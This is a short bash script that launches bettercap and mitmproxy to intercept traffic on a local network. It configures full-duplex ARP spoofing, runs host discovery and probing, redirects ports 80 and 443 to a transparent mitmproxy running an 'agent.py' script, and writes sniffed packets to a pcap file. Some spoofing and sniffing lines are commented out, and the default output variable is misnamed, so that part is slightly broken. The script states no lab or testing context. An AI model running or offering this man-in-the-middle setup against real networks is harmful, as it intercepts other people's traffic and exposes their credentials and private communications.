#!/bin/bash
# Usage /init.sh [SNIFF_OUTPUT_FILE]

if command -v bettercap >/dev/null 2>&1; then
    echo "Bettercap is installed."
else
    echo "Bettercap is NOT installed."
    exit 1
fi

# Default
DEFAULT_SNIFF_OUTPUT_FILE="/tmp/sniff_ouput.pcap"

# ARGS
SNIFF_OUTPUT_FILE="${1:-$DEFAULT_OUTPUT_FILE}"

# Output File
echo "Sniff output will be saved to: $SNIFF_OUTPUT_FILE"
touch "$SNIFF_OUTPUT_FILE"

CMD=(
    "set net.sniff.verbose true"
    ## Ucomment if you want to log to file
    "set net.sniff.output $SNIFF_OUTPUT_FILE"
    "set arp.spoof.fullduplex true"
    "set arp.spoof.internal true"
    "net.recon on"
    "net.probe on"
    "net.show"
    # "net.sniff on"
    # "arp.spoof on"
    # redirct to mitmproxy
    "set any.proxy.dst_port 8080"
    "set any.proxy.src_port 80, 443"
    "any.proxy on"
)

echo "Running bettercap with the following commands"
for arg in "${CMD[@]}"; do
    echo "$arg"
done

animation_XD() {
    local log=$1
    echo "$log"
    for i in {1..3}; do
        sleep 1
        echo -n "."
    done
    echo
}

# betterCap
animation_XD "Starting bettercap"
bettercap -eval "$(
    IFS='; '
    echo "${CMD[*]}"
)"

# mitmproxy
animation_XD "Starting mitmproxy"
mitmproxy --mode transparent -p 8080 -s agent.py --set block_global=false
